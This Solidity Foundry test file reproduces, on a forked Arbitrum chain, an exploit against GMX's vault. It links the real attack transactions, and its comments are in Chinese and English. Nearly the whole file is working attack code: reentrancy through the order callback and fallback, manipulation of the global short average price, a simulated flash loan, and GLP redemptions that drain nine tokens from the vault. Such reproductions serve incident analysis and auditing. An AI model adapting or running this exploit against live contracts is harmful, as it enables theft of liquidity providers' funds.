// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

import "forge-std/Test.sol";
import "../interface.sol";

interface IRewardRouterV2 {
    function mintAndStakeGlp(address _token, uint256 _amount, uint256 _minUsdg, uint256 _minGlp) external returns (uint256);
    function unstakeAndRedeemGlp(address _tokenOut, uint256 _glpAmount, uint256 _minOut, address _receiver) external returns (uint256);
}

interface IGMXPositionRouter {
    function createDecreasePosition(
        address[] memory _path,
        address _indexToken,
        uint256 _collateralDelta,
        uint256 _sizeDelta,
        bool _isLong,
        address _receiver,
        uint256 _acceptablePrice,
        uint256 _minOut,
        uint256 _executionFee,
        bool _withdrawETH,
        address _callbackTarget
    ) external payable returns (bytes32);
    function minExecutionFee() external view returns (uint256);
    function executeDecreasePositions(uint256 _endIndex, address payable _executionFeeReceiver) external;
    function getRequestQueueLengths() external view returns (uint256, uint256, uint256, uint256);
}
interface IGMXOrderBook {
    function createIncreaseOrder(
        address[] memory _path,
        uint256 _amountIn,
        address _indexToken,
        uint256 _minOut,
        uint256 _sizeDelta,
        address _collateralToken,
        bool _isLong,
        uint256 _triggerPrice,
        bool _triggerAboveThreshold,
        uint256 _executionFee,
        bool _shouldWrap
    ) external payable;

    function minExecutionFee() external view returns (uint256);
    function minPurchaseTokenAmountUsd() external view returns (uint256);
    function swapOrdersIndex(address _account) external view returns (uint256);
    function increaseOrdersIndex(address _account) external view returns (uint256);
    function decreaseOrdersIndex(address _account) external view returns (uint256);
    function createDecreaseOrder(
        address _indexToken,
        uint256 _sizeDelta,
        address _collateralToken,
        uint256 _collateralDelta,
        bool _isLong,
        uint256 _triggerPrice,
        bool _triggerAboveThreshold
    ) external payable;
}
interface IGMXRouter {
    function approvePlugin(address _plugin) external;
}

interface IGMXPositionManager {
    function executeIncreaseOrder(address _account, uint256 _orderIndex, address payable _feeReceiver) external;
    function executeDecreaseOrder(address _account, uint256 _orderIndex, address payable _feeReceiver) external;

}

interface IGMXVault {
    function tokenToUsdMin(address _token, uint256 _amount) external view returns (uint256);
    function getPosition(address _account, address _collateralToken, address _indexToken, bool _isLong) external view returns (uint256, uint256, uint256, uint256, uint256, uint256, bool, uint256);
    function globalShortAveragePrices(address _indexToken) external view returns (uint256);
    function increasePosition(
        address _account,
        address _collateralToken,
        address _indexToken,
        uint256 _sizeDelta,
        bool _isLong
    ) external;
    function decreasePosition(
        address _account,
        address _collateralToken,
        address _indexToken,
        uint256 _collateralDelta,
        uint256 _sizeDelta,
        bool _isLong,
        address _receiver
    ) external returns (uint256);
    function poolAmounts(address _token) external view returns (uint256);
    function reservedAmounts(address _token) external view returns (uint256);
    function getMaxPrice(address _token) external view returns (uint256);
    function getMinPrice(address _token) external view returns (uint256);
}

interface IGMXShortsTracker {
    function updateGlobalShortData(address _account, address _collateralToken, address _indexToken, bool _isLong, uint256 _sizeDelta, uint256 _markPrice, bool _isIncrease) external;
}

interface IGMXGlpManager {
    function getGlobalShortDelta(address _token) external view returns (bool, uint256);
    function getGlobalShortAveragePrice(address _token) external view returns (uint256);
    function getAumInUsdg(bool _maximise) external view returns (uint256);
}

interface IGMXFastPriceFeed{
    function setPricesWithBitsAndExecute(
        uint256 _priceBits,
        uint256 _timestamp,
        uint256 _endIndexForIncreasePositions,
        uint256 _endIndexForDecreasePositions,
        uint256 _maxIncreasePositions,
        uint256 _maxDecreasePositions
    ) external;
}

interface IRewardTracker {
    function stakedAmounts(address _account) external view returns (uint256);
}

contract ContractTest is Test {

    IGMXOrderBook orderBook_ = IGMXOrderBook(0x09f77E8A13De9a35a7231028187e9fD5DB8a2ACB);
    IGMXVault vault_ = IGMXVault(0x489ee077994B6658eAfA855C308275EAd8097C4A);
    IGMXRouter router_ = IGMXRouter(0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064);
    IGMXPositionManager positionManager_ = IGMXPositionManager(0x75E42e6f01baf1D6022bEa862A28774a9f8a4A0C);
    IGMXShortsTracker short_tracker_ = IGMXShortsTracker(0xf58eEc83Ba28ddd79390B9e90C4d3EbfF1d434da);
    IGMXGlpManager glp_manager_ = IGMXGlpManager(0x3963FfC9dff443c2A94f21b129D429891E32ec18);
    IGMXPositionRouter positionRouter_ = IGMXPositionRouter(0xb87a436B93fFE9D75c5cFA7bAcFff96430b09868);
    IGMXFastPriceFeed fastPriceFeed_ = IGMXFastPriceFeed(0x11D62807dAE812a0F1571243460Bf94325F43BB7);
    IRewardRouterV2 rewardRouterV2_ = IRewardRouterV2(0xB95DB5B167D75e6d04227CfFFA61069348d271F5);
    IRewardTracker rewardTracker_ = IRewardTracker(0x1aDDD80E6039594eE970E5872D247bf0414C8903);

    IERC20 gmx_lp_token_ = IERC20(0x4277f8F2c384827B5273592FF7CeBd9f2C1ac258);
    IERC20 weth_ = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 btc_ = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
    IERC20 usdc_ = IERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);
    IERC20 usde_ = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IERC20 link_ = IERC20(0xf97f4df75117a78c1A5a0DBb814Af92458539FB4);
    IERC20 uni_ = IERC20(0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0);
    IERC20 usdt_ = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
    IERC20 frax_ = IERC20(0x17FC002b466eEc40DaE837Fc4bE5c67993ddBd6F);
    IERC20 dai_ = IERC20(0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1);

    address routerPositionKeeper_ = 0x2BcD0d9Dde4bD69C516Af4eBd3fB7173e1FA12d0;
    address orderBookKeeper_ = 0xd4266F8F82F7405429EE18559e548979D49160F3;

    bool isProfit = false;
    
    // 区块355878385时，eth价格是2652.39
    function setUp() public {
        vm.createSelectFork("arbitrum", 355878385 - 1);
        deal(address(usdc_), address(this), 3001000000);
        vm.deal(address(this), 2 ether);
        router_.approvePlugin(address(orderBook_));
        router_.approvePlugin(address(positionRouter_));
        usdc_.approve(address(rewardRouterV2_), type(uint256).max);
        usdc_.approve(address(glp_manager_), type(uint256).max);
        frax_.approve(address(rewardRouterV2_), type(uint256).max);
        frax_.approve(address(glp_manager_), type(uint256).max);


    }

    function testExploit() public {
        console2.log("-------- attack before --------");
        console2.log("eth balance of vault = ", weth_.balanceOf(address(vault_)) / 10 ** weth_.decimals());
        console2.log("btc balance of vault = ", btc_.balanceOf(address(vault_)) / 10 ** btc_.decimals());
        console2.log("usdc balance of vault = ", usdc_.balanceOf(address(vault_)) / 10 ** usdc_.decimals());
        console2.log("usde balance of vault = ", usde_.balanceOf(address(vault_)) / 10 ** usde_.decimals());
        console2.log("link balance of vault = ", link_.balanceOf(address(vault_)) / 10 ** link_.decimals());
        console2.log("uni balance of vault = ", uni_.balanceOf(address(vault_)) / 10 ** uni_.decimals());
        console2.log("usdt balance of vault = ", usdt_.balanceOf(address(vault_)) / 10 ** usdt_.decimals());
        console2.log("frax balance of vault = ", frax_.balanceOf(address(vault_)) / 10 ** frax_.decimals());
        console2.log("dai balance of vault = ", dai_.balanceOf(address(vault_)) / 10 ** dai_.decimals());

        for (uint256 i = 0; i < 2; i++) {
            createOpenETHPosition();
            keeperExecuteOpenETHPosition();
        }

        console2.log("glp_manager_.getGlobalShortAveragePrice(address(btc_)) = ", glp_manager_.getGlobalShortAveragePrice(address(btc_)));

        createCloseETHPosition();
        for(uint i = 0; i< 5; i++) {
            keeperExecuteCloseETHPosition();
            keeperExecuteCloseBTCPosition();
        }
        console2.log("glp_manager_.getGlobalShortAveragePrice(address(btc_)) = ", glp_manager_.getGlobalShortAveragePrice(address(btc_)));
        isProfit = true;
        keeperExecuteCloseETHPosition();
        console2.log("-------- attack after --------");
        console2.log("eth balance of vault = ", weth_.balanceOf(address(vault_)) / 10 ** weth_.decimals());
        console2.log("btc balance of vault = ", btc_.balanceOf(address(vault_)) / 10 ** btc_.decimals());
        console2.log("usdc balance of vault = ", usdc_.balanceOf(address(vault_)) / 10 ** usdc_.decimals());
        console2.log("usde balance of vault = ", usde_.balanceOf(address(vault_)) / 10 ** usde_.decimals());
        console2.log("link balance of vault = ", link_.balanceOf(address(vault_)) / 10 ** link_.decimals());
        console2.log("uni balance of vault = ", uni_.balanceOf(address(vault_)) / 10 ** uni_.decimals());
        console2.log("usdt balance of vault = ", usdt_.balanceOf(address(vault_)) / 10 ** usdt_.decimals());
        console2.log("frax balance of vault = ", frax_.balanceOf(address(vault_)) / 10 ** frax_.decimals());
        console2.log("dai balance of vault = ", dai_.balanceOf(address(vault_)) / 10 ** dai_.decimals());
    }

    // https://arbiscan.io/tx/0x0b8cd648fb585bc3d421fc02150013eab79e211ef8d1c68100f2820ce90a4712
    function createOpenETHPosition() public {
        // Leveraged long position opened
        // Used 0.1 ETH to open a 2.003x leveraged position
        // 2.003 = 531 / (0.1 * 2652.39)
        address[] memory path = new address[](1);
        path[0] = address(weth_);
        orderBook_.createIncreaseOrder{value: 0.1003 ether}(
            path, 
            100000000000000000, // amountIn
            address(weth_), // indexToken
            0, // minOut
            531064000000000000000000000000000, // sizeDelta，2.003倍的杠杆
            address(weth_), // collateralToken
            true, // isLong
            1500000000000000000000000000000000, // triggerPrice
            true, // triggerAboveThreshold
            orderBook_.minExecutionFee() * 3, // executionFee
            true // shouldWrap
        );
    }

    // https://arbiscan.io/tx/0x28a000501ef8e3364b0e7f573256b04b87d9a8e8173410c869004b987bf0beef
    function keeperExecuteOpenETHPosition() public {
        vm.startPrank(orderBookKeeper_);
        positionManager_.executeIncreaseOrder(address(this), orderBook_.increaseOrdersIndex(address(this)) - 1, payable(orderBookKeeper_));
        vm.stopPrank();
    }

    // https://app.blocksec.com/explorer/tx/arbitrum/0x20abfeff0206030986b05422080dc9e81dbb53a662fbc82461a47418decc49af    
    function createCloseETHPosition() public {
        (uint256 size, uint256 collateral, uint256 entryPrice, uint256 reserveAmount, uint256 realisedPnl, uint256 entryFundingRate, bool isLong, uint256 lastIncreasedTime) = vault_.getPosition(address(this), address(weth_), address(weth_), true);
        orderBook_.createDecreaseOrder{value: orderBook_.minExecutionFee() * 3}(
            address(weth_),
            size / 2,
            address(weth_),
            collateral/2,
            true,
            1500000000000000000000000000000000,
            true);
    }

    // https://app.blocksec.com/explorer/tx/arbitrum/0x1f00da742318ad1807b6ea8283bfe22b4a8ab0bc98fe428fbfe443746a4a7353?line=162
    function keeperExecuteCloseETHPosition() public {
        vm.startPrank(orderBookKeeper_);
        positionManager_.executeDecreaseOrder(address(this), orderBook_.decreaseOrdersIndex(address(this)) - 1, payable(orderBookKeeper_));
    }


    // https://app.blocksec.com/explorer/tx/arbitrum/0x222cdae82a8d28e53a2bddfb34ae5d1d823c94c53f8a7abc179d47a2c994464e?line=134
    function keeperExecuteCloseBTCPosition() public {
        (uint256 increasePositionRequestKeysStart, uint256 increasePositionRequestKeysLength, uint256 decreasePositionRequestKeysStart, uint256 decreasePositionRequestKeysLength) = positionRouter_.getRequestQueueLengths();
        vm.startPrank(routerPositionKeeper_);
        fastPriceFeed_.setPricesWithBitsAndExecute(
            650780127152856667663437440412910, 
            block.timestamp,
            increasePositionRequestKeysStart + increasePositionRequestKeysLength,
            decreasePositionRequestKeysStart + decreasePositionRequestKeysLength,
            increasePositionRequestKeysLength,
            decreasePositionRequestKeysLength
        );

        vm.stopPrank();
    }

    // Key point: globalShortAveragePrice has already been changed
    // This is GMX’s callback function, gmxPositionCallback, which is called when a market order is closed.
    function gmxPositionCallback(bytes32 positionKey, bool isExecuted, bool isIncrease) external {
        createCloseETHPosition();
    }

    // It is called when closing an ETH position.
    // This is also a critical reentrancy point.
    fallback() external payable {
        if(isProfit) {
            profitAttack();
        }else{
            console2.log("glp_manager_.getGlobalShortAveragePrice(address(btc_)) = ", glp_manager_.getGlobalShortAveragePrice(address(btc_)));
            usdc_.transfer(address(vault_), usdc_.balanceOf(address(this)));
            vault_.increasePosition(address(this), address(usdc_), address(btc_), 90030000000000000000000000000000000, false);
            address[] memory path = new address[](1);
            path[0] = address(usdc_);
            positionRouter_.createDecreasePosition{value: 3000000000000000}(
                path,
                address(btc_),
                0,
                90030000000000000000000000000000000,
                false,
                address(this),
                120000000000000000000000000000000000,
                0,
                3000000000000000,
                false,
                address(this)
            );
        }
    }

    // https://app.blocksec.com/explorer/tx/arbitrum/0x03182d3f0956a91c4e4c8f225bbc7975f9434fab042228c7acdc5ec9a32626ef
    function profitAttack() public{
        console2.log("******* start profitAttack *******");
        // flashloan usdc 7538567_619570
        deal(address(usdc_), address(this), 7_538_567_619570); 
        uint256 glpAmount = rewardRouterV2_.mintAndStakeGlp(address(usdc_), 6000000000000, 0, 0);
        usdc_.transfer(address(vault_), usdc_.balanceOf(address(this)));

        vault_.increasePosition(address(this), address(usdc_), address(btc_), 15385676195700000000000000000000000000, false);
        getProfitForETH();
        getProfitForBTC();
        getProfitForUSDC();
        getProfitForUSDE();
        getProfitForLINK();
        getProfitForUNI();
        getProfitForUSDT();
        getProfitForFRAX();
        getProfitForDAI();
        vault_.decreasePosition(address(this), address(usdc_), address(btc_), 0, 15385676195700000000000000000000000000, false, address(this));

        for(uint i = 0; i < 10; i++) {            
            
            rewardRouterV2_.mintAndStakeGlp(address(frax_), 9000000000000000000000000, 0, 0);
            usdc_.transfer(address(vault_), 500000000000);
            vault_.increasePosition(address(this), address(usdc_), address(btc_), 12500000000000000000000000000000000000, false);
            getProfitForFRAX();
            vault_.decreasePosition(address(this), address(usdc_), address(btc_), 0, 12500000000000000000000000000000000000, false, address(this));
            console2.log("glpAmount = ", IERC20(address(rewardTracker_)).balanceOf(address(this)));
        }
        getProfitForUSDC();
        usdc_.transfer(address(0x1), 7_538_567_619570); // repay flashloan
        console2.log("profit weth_ of Attacker ", weth_.balanceOf(address(this)) / 10 ** weth_.decimals());
        console2.log("profit btc_ of Attacker ", btc_.balanceOf(address(this)) / 10 ** btc_.decimals());
        console2.log("profit usdc_ of Attacker ", usdc_.balanceOf(address(this)) / 10 ** usdc_.decimals());
        console2.log("profit usde_ of Attacker ", usde_.balanceOf(address(this)) / 10 ** usde_.decimals());
        console2.log("profit link_ of Attacker ", link_.balanceOf(address(this)) / 10 ** link_.decimals());
        console2.log("profit uni_ of Attacker ", uni_.balanceOf(address(this)) / 10 ** uni_.decimals());
        console2.log("profit usdt_ of Attacker ", usdt_.balanceOf(address(this)) / 10 ** usdt_.decimals());
        console2.log("profit frax_ of Attacker ", frax_.balanceOf(address(this)) / 10 ** frax_.decimals());
        console2.log("profit dai_ of Attacker ", dai_.balanceOf(address(this)) / 10 ** dai_.decimals());
        console2.log("******* end profitAttack *******");
    }

    function getProfitForETH() public {
        uint256 profit_delta = vault_.poolAmounts(address(weth_)) - vault_.reservedAmounts(address(weth_));
        uint256 price = vault_.getMaxPrice(address(weth_)); // 1e30
        uint256 usdgAmount = profit_delta * price / (10 ** weth_.decimals()) / 1e12; // (token * 1e30 / 1eN) / 1e12 = 1e18
        uint256 glpTotal = gmx_lp_token_.totalSupply(); // 1e18
        uint256 aumInUsdg = glp_manager_.getAumInUsdg(false); // 1e18
        uint256 glpAmount = usdgAmount * glpTotal / aumInUsdg; // 1e18
        rewardRouterV2_.unstakeAndRedeemGlp(address(weth_), glpAmount, 0, address(this));
    }
    function getProfitForBTC() public {
        uint256 profit_delta = vault_.poolAmounts(address(btc_)) - vault_.reservedAmounts(address(btc_));
        uint256 price = vault_.getMaxPrice(address(btc_)); // 1e30
        uint256 usdgAmount = profit_delta * price / (10 ** btc_.decimals()) / 1e12; // (token * 1e30 / 1eN) / 1e12 = 1e18
        uint256 glpTotal = gmx_lp_token_.totalSupply(); // 1e18
        uint256 aumInUsdg = glp_manager_.getAumInUsdg(false); // 1e18
        uint256 glpAmount = usdgAmount * glpTotal / aumInUsdg; // 1e18
        rewardRouterV2_.unstakeAndRedeemGlp(address(btc_), glpAmount, 0, address(this));
    }
    function getProfitForUSDC() public {
        uint256 profit_delta = vault_.poolAmounts(address(usdc_)) - vault_.reservedAmounts(address(usdc_));
        uint256 price = vault_.getMaxPrice(address(usdc_)); // 1e30
        uint256 usdgAmount = profit_delta * price / (10 ** usdc_.decimals()) / 1e12; // (token * 1e30 / 1eN) / 1e12 = 1e18
        uint256 glpTotal = gmx_lp_token_.totalSupply(); // 1e18
        uint256 aumInUsdg = glp_manager_.getAumInUsdg(false); // 1e18
        uint256 glpAmount = usdgAmount * glpTotal / aumInUsdg; // 1e18
        rewardRouterV2_.unstakeAndRedeemGlp(address(usdc_), glpAmount, 0, address(this));
    }
    function getProfitForUSDE() public {
        uint256 profit_delta = vault_.poolAmounts(address(usde_)) - vault_.reservedAmounts(address(usde_));
        uint256 price = vault_.getMaxPrice(address(usde_)); // 1e30
        uint256 usdgAmount = profit_delta * price / (10 ** usde_.decimals()) / 1e12; // (token * 1e30 / 1eN) / 1e12 = 1e18
        uint256 glpTotal = gmx_lp_token_.totalSupply(); // 1e18
        uint256 aumInUsdg = glp_manager_.getAumInUsdg(false); // 1e18
        uint256 glpAmount = usdgAmount * glpTotal / aumInUsdg; // 1e18
        rewardRouterV2_.unstakeAndRedeemGlp(address(usde_), glpAmount, 0, address(this));
    }
    function getProfitForLINK() public {
        uint256 profit_delta = vault_.poolAmounts(address(link_)) - vault_.reservedAmounts(address(link_));
        uint256 price = vault_.getMaxPrice(address(link_)); // 1e30
        uint256 usdgAmount = profit_delta * price / (10 ** link_.decimals()) / 1e12; // (token * 1e30 / 1eN) / 1e12 = 1e18
        uint256 glpTotal = gmx_lp_token_.totalSupply(); // 1e18
        uint256 aumInUsdg = glp_manager_.getAumInUsdg(false); // 1e18
        uint256 glpAmount = usdgAmount * glpTotal / aumInUsdg; // 1e18
        rewardRouterV2_.unstakeAndRedeemGlp(address(link_), glpAmount, 0, address(this));
    }
    function getProfitForUNI() public {
        uint256 profit_delta = vault_.poolAmounts(address(uni_)) - vault_.reservedAmounts(address(uni_));
        uint256 price = vault_.getMaxPrice(address(uni_)); // 1e30
        uint256 usdgAmount = profit_delta * price / (10 ** uni_.decimals()) / 1e12; // (token * 1e30 / 1eN) / 1e12 = 1e18
        uint256 glpTotal = gmx_lp_token_.totalSupply(); // 1e18
        uint256 aumInUsdg = glp_manager_.getAumInUsdg(false); // 1e18
        uint256 glpAmount = usdgAmount * glpTotal / aumInUsdg; // 1e18
        rewardRouterV2_.unstakeAndRedeemGlp(address(uni_), glpAmount, 0, address(this));
    }
    function getProfitForUSDT() public {
        uint256 profit_delta = vault_.poolAmounts(address(usdt_)) - vault_.reservedAmounts(address(usdt_));
        uint256 price = vault_.getMaxPrice(address(usdt_)); // 1e30
        uint256 usdgAmount = profit_delta * price / (10 ** usdt_.decimals()) / 1e12; // (token * 1e30 / 1eN) / 1e12 = 1e18
        uint256 glpTotal = gmx_lp_token_.totalSupply(); // 1e18
        uint256 aumInUsdg = glp_manager_.getAumInUsdg(false); // 1e18
        uint256 glpAmount = usdgAmount * glpTotal / aumInUsdg; // 1e18
        rewardRouterV2_.unstakeAndRedeemGlp(address(usdt_), glpAmount, 0, address(this));
    }
    function getProfitForFRAX() public {
        uint256 profit_delta = vault_.poolAmounts(address(frax_)) - vault_.reservedAmounts(address(frax_));
        uint256 price = vault_.getMaxPrice(address(frax_)); // 1e30
        uint256 usdgAmount = profit_delta * price / (10 ** frax_.decimals()) / 1e12; // (token * 1e30 / 1eN) / 1e12 = 1e18
        uint256 glpTotal = gmx_lp_token_.totalSupply(); // 1e18
        uint256 aumInUsdg = glp_manager_.getAumInUsdg(false); // 1e18
        uint256 glpAmount = usdgAmount * glpTotal / aumInUsdg; // 1e18
        rewardRouterV2_.unstakeAndRedeemGlp(address(frax_), glpAmount, 0, address(this));
    }
    function getProfitForDAI() public {
        uint256 profit_delta = vault_.poolAmounts(address(dai_)) - vault_.reservedAmounts(address(dai_));
        uint256 price = vault_.getMaxPrice(address(dai_)); // 1e30
        uint256 usdgAmount = profit_delta * price / (10 ** dai_.decimals()) / 1e12; // (token * 1e30 / 1eN) / 1e12 = 1e18
        uint256 glpTotal = gmx_lp_token_.totalSupply(); // 1e18
        uint256 aumInUsdg = glp_manager_.getAumInUsdg(false); // 1e18
        uint256 glpAmount = usdgAmount * glpTotal / aumInUsdg; // 1e18
        rewardRouterV2_.unstakeAndRedeemGlp(address(dai_), glpAmount, 0, address(this));
    }
}
